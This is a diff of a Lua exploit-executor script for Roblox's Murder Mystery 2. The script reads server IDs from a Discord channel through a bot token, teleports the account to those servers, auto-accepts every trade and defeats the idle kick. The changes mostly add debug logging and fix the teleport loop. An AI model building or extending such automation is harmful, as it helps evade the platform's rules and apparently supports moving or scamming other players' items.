@@ -1,25 +1,31 @@
 -- ============================================================
---              MM2 AUTO‑JOINER (Simple & Lag‑Free)
--- ============================================================
--- Usage: set bottoken, chanelid, tradesbeforenext before loading.
+--              MM2 AUTO‑JOINER (Debug Teleport)
 -- ============================================================
 
 if getgenv().__mm2_autojoiner_loaded then return end
 getgenv().__mm2_autojoiner_loaded = true
 
--- External configuration (set these before running, or hardcode)
 bottoken = bottoken or ""
 chanelid = chanelid or ""
 tradesbeforenext = tradesbeforenext or 1
 
+print("[DEBUG] bottoken:", bottoken ~= "" and "set" or "missing")
+print("[DEBUG] chanelid:", chanelid ~= "" and "set" or "missing")
+print("[DEBUG] tradesbeforenext:", tradesbeforenext)
+
 repeat task.wait() until game:IsLoaded()
-if game.PlaceId ~= 142823291 then return end  -- only MM2
+print("[DEBUG] Game loaded, PlaceId:", game.PlaceId)
+if game.PlaceId ~= 142823291 then 
+    print("[DEBUG] Not MM2, exiting")
+    return 
+end
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
+print("[DEBUG] Services loaded")
 
 -- Anti‑AFK
 for _, b in ipairs(getconnections(LocalPlayer.Idled)) do b:Disable() end
@@ -50,10 +56,8 @@ end
 -- ========== TRADE AUTO‑ACCEPT ==========
 local tradesDone = 0
 local lastActivity = tick()
-
 local function resetActivity() lastActivity = tick() end
 
--- Accept offer updates
 ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(nub)
     if nub.LastOffer then
         local last = nub.LastOffer
@@ -61,12 +65,11 @@ ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(nub)
             if nub.LastOffer ~= last then break end
             ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, nub.LastOffer)
             resetActivity()
-            task.wait(0.1)  -- fast enough, low CPU
+            task.wait(0.1)
         end
     end
 end)
 
--- Accept incoming requests
 task.spawn(function()
     while true do
         local status = ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
@@ -78,7 +81,6 @@ task.spawn(function()
     end
 end)
 
--- Detect trade completion
 task.spawn(function()
     while true do
         local status = ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
@@ -105,11 +107,12 @@ local MIN_STAY = 3
 
 task.spawn(function()
     while true do
-        task.wait(2)   -- check every 2s (anti‑lag)
+        task.wait(2)
         if not currentJobMsgId then continue end
         if tick() - lastActivity < MIN_STAY then continue end
         local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Trade")
         if (not tradeUI and (tick() - lastActivity >= IDLE_TIMEOUT)) or tradesDone >= tradesbeforenext then
+            print("[DEBUG] Idle hop triggered, reacting ✅")
             react(currentJobMsgId, "✅")
             currentJobMsgId = nil
             tradesDone = 0
@@ -173,28 +176,35 @@ local teleporting = false
 local currentTarget = nil
 
 function teleportTo(placeId, jobId, msgid)
+    print("[DEBUG] teleportTo called with placeId:", placeId, "jobId:", jobId, "msgid:", msgid)
     currentTarget = { placeId = tonumber(placeId), jobId = jobId, msgid = msgid }
-    if teleporting then return end
+    if teleporting then 
+        print("[DEBUG] Already teleporting, skipping")
+        return 
+    end
     teleporting = true
 
     task.spawn(function()
         local failed = false
         local conn = TeleportService.TeleportInitFailed:Connect(function(player)
-            if player == LocalPlayer then failed = true end
+            if player == LocalPlayer then failed = true; print("[DEBUG] TeleportInitFailed fired") end
         end)
 
         while teleporting do
             local target = currentTarget
             failed = false
-            local ok = pcall(function()
+            print("[DEBUG] Attempting teleport to:", target.placeId, target.jobId)
+            local ok, err = pcall(function()
                 TeleportService:TeleportToPlaceInstance(target.placeId, target.jobId, LocalPlayer)
             end)
             if ok and target.msgid then
+                print("[DEBUG] Teleport initiated successfully")
                 addtolist("jnubs.txt", target.msgid)
                 currentJobMsgId = target.msgid
                 resetActivity()
                 tradesDone = 0
             else
+                print("[DEBUG] Teleport failed:", err)
                 if target.msgid then react(target.msgid, "❌") end
                 currentJobMsgId = nil
             end
@@ -204,33 +214,65 @@ function teleportTo(placeId, jobId, msgid)
                 task.wait(0.5); t = t + 0.5
             end
             if currentTarget == target then
-                task.wait(2)   -- retry backoff
+                print("[DEBUG] Retrying after 2s")
+                task.wait(2)
+            else
+                print("[DEBUG] Target changed, breaking loop")
+                break
             end
         end
         if conn then conn:Disconnect() end
+        teleporting = false
+        print("[DEBUG] Teleport loop ended")
     end)
 end
 
 -- ========== PROCESS DISCORD MESSAGES ==========
 local function processJoinMessage(msg)
-    if not msg or not msg.author then return end
-    if msg.channel_id and msg.channel_id ~= chanelid then return end
+    if not msg or not msg.author then 
+        print("[DEBUG] processJoinMessage: no msg or author")
+        return 
+    end
+    if msg.channel_id and msg.channel_id ~= chanelid then 
+        print("[DEBUG] Wrong channel:", msg.channel_id)
+        return 
+    end
     local content = msg.content or ""
+    print("[DEBUG] Processing message:", content)
     local placeId, jobId = string.match(content, "(%d+),%s*'([^']+)'")
     if not (placeId and jobId) then
         placeId, jobId = string.match(content, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"')
     end
-    if not (placeId and jobId) then return end
-    if tonumber(placeId) ~= 142823291 then return end   -- only MM2
+    if not (placeId and jobId) then
+        print("[DEBUG] Could not parse placeId/jobId from:", content)
+        return
+    end
+    print("[DEBUG] Parsed -> placeId:", placeId, "jobId:", jobId)
+    if tonumber(placeId) ~= 142823291 then 
+        print("[DEBUG] Not MM2 place, ignoring")
+        return 
+    end
 
     react(msg.id, "👀")
-    if inlist("jnubs.txt", msg.id) then return end
-    if jobId == game.JobId then return end
+    if inlist("jnubs.txt", msg.id) then 
+        print("[DEBUG] Already processed this message, ignoring")
+        return 
+    end
+    if jobId == game.JobId then 
+        print("[DEBUG] JobId matches current server, ignoring")
+        return 
+    end
 
     local q = readlist("queue.txt")
-    for _, j in ipairs(q) do if j.msgid == msg.id then return end end
+    for _, j in ipairs(q) do 
+        if j.msgid == msg.id then 
+            print("[DEBUG] Already in queue, ignoring")
+            return 
+        end 
+    end
     table.insert(q, { placeId = placeId, jobId = jobId, msgid = msg.id, author = msg.author.username })
     writelist("queue.txt", q)
+    print("[DEBUG] Added to queue, queue size:", #q)
 end
 
 -- ========== QUEUE PROCESSOR ==========
@@ -242,8 +284,11 @@ task.spawn(function()
             if #q > 0 then
                 local job = table.remove(q, 1)
                 writelist("queue.txt", q)
+                print("[DEBUG] Queue processor picked job:", job.placeId, job.jobId)
                 if job and job.msgid and not inlist("jnubs.txt", job.msgid) and job.jobId ~= game.JobId then
                     teleportTo(job.placeId, job.jobId, job.msgid)
+                else
+                    print("[DEBUG] Skipping job – already done or same server")
                 end
             end
         end
@@ -325,7 +370,6 @@ function connectgateway()
         if connectionId == myId then connectgateway() end
     end)
 
-    -- Watchdog
     task.spawn(function()
         task.wait(6)
         if connectionId == myId and helloConnId ~= myId then
@@ -344,4 +388,4 @@ function connectgateway()
 end
 
 connectgateway()
-print("[MM2 Autojoiner] Simple & lag‑free. Ready.")
+print("[MM2 Autojoiner] Debug version started. Watch console for logs.")
